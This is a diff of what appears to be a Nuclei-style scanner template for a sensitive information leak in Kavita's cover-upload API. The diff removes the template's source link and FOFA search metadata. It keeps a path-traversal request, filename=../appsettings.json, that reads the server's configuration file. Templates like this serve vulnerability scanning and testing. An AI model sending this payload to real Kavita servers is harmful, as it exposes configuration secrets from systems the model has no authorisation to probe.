@@ -3,14 +3,8 @@ info:
   name: Kavitacover-upload存在敏感信息泄露漏洞
   author: hacktwo
   severity: medium
-  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/565d39ccb7fb89e96df6a9f4e9af8a2c
-
-    [!] 推断说明: 状态码缺失, 推断为 200。原文响应特征为截图, 无法自动提取文本命中条件, 使用前请人工核验。'
+  description: '[!] 推断说明: 状态码缺失, 推断为 200。原文响应特征为截图, 无法自动提取文本命中条件, 使用前请人工核验。'
   tags: file-upload,info-leak,2025
-  metadata:
-    source: yuque-hacktwo-dtdx2v
-    doc-slug: 565d39ccb7fb89e96df6a9f4e9af8a2c
-    fofa: + fofa`title="Kavita"`
 http:
 - raw:
   - 'GET /api/image/cover-upload?filename=../appsettings.json HTTP/2
